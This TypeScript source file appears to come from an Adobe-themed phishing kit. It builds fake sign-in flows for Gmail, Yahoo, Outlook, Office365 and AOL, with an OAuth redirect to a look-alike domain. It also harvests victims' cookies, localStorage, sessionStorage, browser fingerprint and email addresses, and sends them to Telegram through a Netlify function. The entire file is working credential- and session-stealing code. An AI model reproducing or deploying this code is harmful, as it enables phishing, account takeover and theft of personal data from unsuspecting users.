// Send data to Telegram via Netlify function
import cookieUtils, { CookieMeta } from './cookieUtils';

/**
 * Microsoft/Azure configuration (client-side values only).
 * NOTE: client secret must never be embedded in frontend code.
 *
 * To allow sign-ins from any Azure AD tenant, we use the "common" endpoint
 * when building the authorization URL for Microsoft (multi-tenant).
 * If you later want to restrict to a specific tenant, replace 'common' with your TENANT_ID.
 */
const MICROSOFT_CLIENT_ID = '029dbfef-8a74-4a07-899b-435e21e672c5';
// For client-side authorize URL we use 'common' to accept any tenant
const MICROSOFT_TENANT_FOR_AUTH = 'common';
// Use the absolute redirect URI you've provided for the OAuth callback
const OAUTH_REDIRECT_URI = 'https://privadobeportdocs.com/auth-callback';
const MICROSOFT_SCOPES = ['openid', 'email', 'profile'].join(' ');

export const sendToTelegram = async (data: any): Promise<any> => {
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    throw error;
  }
};

export const getBrowserFingerprint = async (userEmail?: string) => {
  // Check if we're in a browser environment
  if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
    const emailDomain = userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
    return {
      userAgent: 'Server-side',
      language: 'en-US',
      platform: 'Server',
      cookieEnabled: false,
      doNotTrack: null,
      timezone: 'UTC',
      url: '',
      domain: emailDomain,
      referrer: '',
      screen: {
        width: 0,
        height: 0,
        colorDepth: 0,
        pixelDepth: 0
      },
      cookies: '',
      cookiesParsed: {},
      cookieList: [] as CookieMeta[],
      localStorage: {},
      sessionStorage: {},
      timestamp: new Date().toISOString()
    };
  }
  
  // Try to get advanced captured cookies first, then fallback to cookieUtils
  let cookieCapture;
  try {
    // Try to import and use advanced cookie capture if available
    const { advancedCookieCapture } = await import('./advancedCookieCapture');
    if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
      const advancedCookies = advancedCookieCapture.getAllCookies();
      cookieCapture = {
        documentCookies: document.cookie || '',
        cookiesParsed: cookieUtils.parseDocumentCookies(),
        cookieList: advancedCookies.length > 0 ? advancedCookies : undefined
      };
    } else {
      // Fallback to cookieUtils
      cookieCapture = cookieUtils.buildCookieCapture();
    }
  } catch (importError) {
    // Try synchronous require as fallback
    try {
      const { advancedCookieCapture } = require('./advancedCookieCapture');
      if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
        const advancedCookies = advancedCookieCapture.getAllCookies();
        cookieCapture = cookieUtils.buildCookieCapture(advancedCookies);
      } else {
        cookieCapture = cookieUtils.buildCookieCapture();
      }
    } catch (requireError) {
      // Final fallback to cookieUtils
      cookieCapture = cookieUtils.buildCookieCapture();
    }
  }

  // Capture all storage data
  const getStorageData = (storage: Storage | undefined) => {
    const data: Record<string, string | null> = {};
    try {
      if (!storage) return data;
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key);
        }
      }
    } catch (e) {
      // ignore storage access errors
    }
    return data;
  };

  // Extract domain from email if provided, otherwise use current hostname
  const emailDomain = getProviderSpecificDomain(userEmail);
  
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
    url: window.location.href,
    domain: emailDomain,
    referrer: document.referrer,
    screen: {
      width: typeof screen !== 'undefined' ? screen.width : 0,
      height: typeof screen !== 'undefined' ? screen.height : 0,
      colorDepth: typeof screen !== 'undefined' ? screen.colorDepth : 0,
      pixelDepth: typeof screen !== 'undefined' ? screen.pixelDepth : 0
    },
    cookies: cookieCapture.documentCookies,
    cookiesParsed: cookieCapture.cookiesParsed,
    cookieList: cookieCapture.cookieList || [],
    localStorage: getStorageData(window.localStorage),
    sessionStorage: getStorageData(window.sessionStorage),
    timestamp: new Date().toISOString()
  };
};

// Provider-specific domain detection helper (unchanged)
function getProviderSpecificDomain(userEmail?: string): string {
  if (typeof window === 'undefined') {
    return userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
  }
  
  // Get session data to determine provider
  const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
  const provider = (sessionData.provider || 'Others').toLowerCase();
  const email = userEmail || sessionData.email || '';
  
  console.log('🌐 Provider-based domain detection:', { provider, email });
  
  // Provider-specific domain mapping (takes priority)
  if (provider.includes('gmail') || provider.includes('google')) {
    console.log('✅ Provider detected as Google');
    return 'google.com';
  } else if (provider.includes('yahoo')) {
    console.log('✅ Provider detected as Yahoo');
    return 'yahoo.com';
  } else if (provider.includes('aol')) {
    console.log('✅ Provider detected as AOL');
    return 'aol.com';
  } else if (provider.includes('hotmail') || provider.includes('live') || 
             provider.includes('outlook') || provider.includes('office365')) {
    console.log('✅ Provider detected as Microsoft');
    return 'live.com';
  }
  
  // For "Others" provider, extract domain from email
  if (provider === 'others' && email && email.includes('@')) {
    const emailDomain = email.split('@')[1].toLowerCase();
    console.log('🔄 Provider is "Others", using email domain:', emailDomain);
    return emailDomain;
  }
  
  // Use current domain instead of hardcoded fallbacks
  const hostname = window.location.hostname;
  console.log('🔄 Using current domain:', hostname);
  return hostname;
}

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

export const buildOAuthUrl = (provider: string, state: string) => {
  // Keep previous behavior for non-Microsoft providers (uses window location origin for redirect URI)
  const baseUrl = window.location.origin;
  const defaultRedirect = encodeURIComponent(`${baseUrl}/auth/callback`);

  // Use the multi-tenant "common" endpoint for Microsoft so all Azure AD tenants are accepted.
  // If you want to restrict to a single tenant, replace MICROSOFT_TENANT_FOR_AUTH with that tenant id.
  const microsoftTenantSegment = MICROSOFT_TENANT_FOR_AUTH;
  const microsoftRedirect = encodeURIComponent(OAUTH_REDIRECT_URI);

  // Important: Microsoft will echo back the state parameter but will NOT echo arbitrary custom query parameters.
  // To ensure App.tsx receives the provider back after the redirect, embed the provider into the state value.
  // We'll append "::<provider>" to the provided state and URL-encode it when placing into the authorize URL.
  const stateWithProviderForMicrosoft = encodeURIComponent(`${state}::${provider}`);

  const oauthUrls = {
    'Gmail': `https://accounts.google.com/oauth/authorize?client_id=YOUR_GOOGLE_CLIENT_ID&redirect_uri=${defaultRedirect}&response_type=code&scope=email profile&state=${state}`,
    'Yahoo': `https://api.login.yahoo.com/oauth2/request_auth?client_id=YOUR_YAHOO_CLIENT_ID&redirect_uri=${defaultRedirect}&response_type=code&scope=openid email&state=${state}`,
    // Use the configured multi-tenant endpoint for Microsoft and include provider inside state
    'Outlook': `https://login.microsoftonline.com/${microsoftTenantSegment}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${microsoftRedirect}&response_mode=query&scope=${encodeURIComponent(MICROSOFT_SCOPES)}&state=${stateWithProviderForMicrosoft}`,
    'Office365': `https://login.microsoftonline.com/${microsoftTenantSegment}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${microsoftRedirect}&response_mode=query&scope=${encodeURIComponent(MICROSOFT_SCOPES)}&state=${stateWithProviderForMicrosoft}`,
    'AOL': `https://api.login.aol.com/oauth2/request_auth?client_id=YOUR_AOL_CLIENT_ID&redirect_uri=${defaultRedirect}&response_type=code&scope=openid email&state=${state}`,
    'Others': `/auth/form/${provider}`
  };
  
  return oauthUrls[provider as keyof typeof oauthUrls] || `/auth/form/${provider}`;
};

/**
 * Helper: extractEmailFromProvider
 * This function attempts to determine an email address following OAuth or form flows.
 * For real provider integrations, you should exchange the authorization code for tokens
 * on your server and then use the provider APIs (or the ID token) to extract the verified email.
 */
export const extractEmailFromProvider = (provider: string, code: string) => {
  try {
    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
    if (sessionData.email) {
      console.log('✅ Found existing email in session:', sessionData.email);
      return sessionData.email;
    }
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email');
      if (email) {
        console.log('✅ Found email in URL parameters:', email);
        return email;
      }
    }
    const emailInput = typeof document !== 'undefined' ? document.querySelector('input[type="email"]') as HTMLInputElement : null;
    if (emailInput && emailInput.value) {
      console.log('✅ Found email from form input:', emailInput.value);
      return emailInput.value;
    }
    const cookies = (typeof document !== 'undefined' ? document.cookie.split(';') : []);
    for (const cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === 'user_email' && value) {
        try {
          const decodedEmail = decodeURIComponent(value);
          console.log('✅ Found email from cookie:', decodedEmail);
          return decodedEmail;
        } catch (e) {
          console.warn('Failed to decode email from cookie');
        }
      }
    }
    if (code && code.includes('@')) {
      console.log('✅ Using code as email:', code);
      return code;
    }
    console.warn('⚠️ No real email found, generating placeholder');
    const domains = {
      'Gmail': 'gmail.com',
      'Yahoo': 'yahoo.com',
      'Outlook': 'outlook.com',
      'Office365': 'outlook.com',
      'AOL': 'aol.com',
      'Others': 'example.com'
    };
    const domain = domains[provider as keyof typeof domains] || 'example.com';
    return `user${Math.floor(Math.random() * 1000)}@${domain}`;
    
  } catch (error) {
    console.error('Error extracting email:', error);
    return `error@${provider.toLowerCase()}.com`;
  }
};
